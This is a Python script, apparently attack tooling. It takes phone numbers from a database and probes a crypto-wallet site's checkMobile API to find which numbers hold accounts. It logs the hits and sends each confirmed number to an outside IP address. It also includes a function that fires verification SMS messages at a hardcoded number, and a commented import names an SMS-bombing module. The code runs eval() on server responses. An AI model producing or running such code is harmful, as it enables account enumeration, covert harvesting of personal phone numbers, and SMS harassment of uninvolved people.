# coding:utf-8
import requests
# from 短信轰炸.number_mongo import number_six
# from number_mongo import number_BaFangZiYuan


def send_sms():
    # {"data":{"result":180,"responseCode":0},"msg":"请求成功","code":"0","err":""}
    headers = {'Host': 'www.bao.top', 'Connection': 'keep-alive', 'Content-Length': '32', 'Pragma': 'no-cache',
               'Cache-Control': 'no-cache', 'Accept': 'application/json, text/javascript, */*; q=0.01',
               'Origin': 'https://www.bao.top', 'X-Requested-With': 'XMLHttpRequest',
               'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36',
               'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
               'Referer': 'https://www.bao.top/register.html', 'Accept-Encoding': 'gzip, deflate, br',
               'Accept-Language': 'zh-CN,zh;q=0.9',
               'Cookie': '__cdnuid=6e6cdb778817a417d9f77e64cae1bf91; __lnkrntdmcvrd=-1'}
    url = "https://www.bao.top/vct/api/bibao/getMobileCode"
    form_data = [
        ('mobile', 18505615375),
        ('codeType', 1001),
    ]
    page = requests.post(url, headers=headers, data=form_data).text
    print(eval(page))
    return eval(page)


def check_number(number):
    headers = {'Host': 'www.bao.top', 'Connection': 'keep-alive', 'Content-Length': '18', 'Pragma': 'no-cache',
               'Cache-Control': 'no-cache', 'Accept': 'application/json, text/javascript, */*; q=0.01',
               'Origin': 'https://www.bao.top', 'X-Requested-With': 'XMLHttpRequest',
               'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36',
               'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
               'Referer': 'https://www.bao.top/register.html', 'Accept-Encoding': 'gzip, deflate, br',
               'Accept-Language': 'zh-CN,zh;q=0.9',
               'Cookie': '__cdnuid=6e6cdb778817a417d9f77e64cae1bf91; __lnkrntdmcvrd=-1'}
    url = "https://www.bao.top/vct/api/Bibao/checkMobile"
    form_data = [('mobile', number),
                 ]
    page = requests.post(url, headers=headers, data=form_data).text
    print(page)
    return page


def save_success_number(number):
    with open("success_币包.txt", "a+")as f:
        f.write(str(number) + "\n")


def save_faile_number(number):
    with open("faile_币包.txt", "a+")as f:
        f.write(str(number) + "\n")


def save(number):
    url ="http://122.114.183.102:8080/saveNumber/{0}/".format(number,)
    print(requests.get(url).text)


if __name__ == "__main__":

    count = 0
    while True:
        try:
            with open("flag_币包.txt")as f:
                count = int(f.read())
            for res in number_BaFangZiYuan.find({'_id': count}):
                line = res["number"].replace("\n", "")
                print(line, count)
                count += 1
                result = check_number(line)
                if str(result).find("true") != -1:
                    save_success_number(number=line)
                    save(number=line)
                else:
                    save_faile_number(number=line)
            with open("flag_币包.txt", "w")as f:
                f.write(str(count))
        except:
            pass

# {"data":{"result":false,"responseCode":0},"msg":"请求成功","code":"0","err":""}没有此手机号
# {"data":{"result":true,"responseCode":0},"msg":"请求成功","code":"0","err":""}
